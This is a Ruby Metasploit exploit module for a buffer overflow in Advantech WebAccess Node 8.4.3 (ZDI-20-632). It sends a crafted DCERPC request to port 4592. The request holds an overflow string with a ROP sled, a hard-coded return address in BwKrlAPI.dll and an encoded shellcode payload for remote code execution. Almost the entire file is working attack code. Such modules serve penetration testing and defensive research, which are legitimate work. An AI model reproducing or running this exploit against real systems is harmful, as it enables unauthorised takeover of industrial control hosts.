require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::DCERPC

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Advantech WebAccess Node bwscrp.exe Buffer Overflow',
      'Description'    => %q{
      },
      'Author'         =>
        [
          'Mario Ceballos' 
        ],
      'License'        => 'BSD_LICENSE',
      'References'     =>
        [
          ['ZDI', '20-632']
        ],
      'Privileged'     => true,
      'DefaultOptions' =>
        {
	  'EXITFUNC' => 'process',
	},
      'Payload'        =>
        {
          'BadChars' => "\x00\x0a\x20\x0d",
          'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
          'Space'       => 450,
        },
      'Platform'      => %w{ win },
      'Targets'        =>
        [
         [ 'AdvantechWebAccessNode V8.4.3.exe', { 'Ret' => 0x020460bb } ], # BwKrlAPI.dll
        ],
      'DisclosureDate' => 'May 8 2020',
      'DefaultTarget'  => 0
      ))
    register_options( [ Opt::RPORT(4592) ], self.class )

  end

  def exploit
   connect
   handle = dcerpc_handle('5d2b62aa-ee0a-4a95-91ae-b064fdb471fc', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])
   dcerpc_bind(handle)
   print_status("Bound to #{handle} ...")

   packet =  NDR.long(0)
   packet << NDR.long(0xc351)
   packet << NDR.long(0x04)

   begin
     resp = dcerpc.call(0x2, packet)
   rescue Rex::Proto::DCERPC::Exceptions::NoResponse
   ensure
   end

   begin
     resp = dcerpc.call(0x4, NDR.long(2))
     handle = resp.last(4).unpack('V').first

     ropnop = [0x02031021].pack('V') * 6
     data = rand_text_alpha_upper(2024)
     data[502, ropnop.size] = ropnop
     data[526, 4 + 24 +  payload.encoded.size] = [target.ret].pack('V') + "\x96" * 24 + payload.encoded

     packet2 =  NDR.long(handle)
     packet2 << NDR.long(0x2711) 
     packet2 << NDR.long(0x204)
     packet2 << NDR.long(0x204)
     packet2 << "bwscrp #{data} #{rand_text_alpha_upper(5)}"
     packet2 << NDR.long(0) * 125

     print_status("Trying target #{target.name}...")
    begin
     dcerpc_call(0x1, packet2)
    rescue Rex::Proto::DCERPC::Exceptions::NoResponse
    end
   end
  end
end
